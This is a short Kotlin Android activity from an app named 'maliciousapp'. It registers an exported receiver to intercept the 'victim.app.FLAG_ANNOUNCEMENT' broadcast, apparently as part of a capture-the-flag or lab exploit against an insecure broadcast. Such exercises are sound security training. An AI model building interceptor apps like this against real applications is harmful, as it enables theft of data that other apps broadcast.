package com.example.maliciousapp

import android.content.IntentFilter
import android.os.Bundle

import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        ContextCompat.registerReceiver(
            this,
            FlagReceiver(),
            IntentFilter("victim.app.FLAG_ANNOUNCEMENT"),
            ContextCompat.RECEIVER_EXPORTED
        )
    }
}
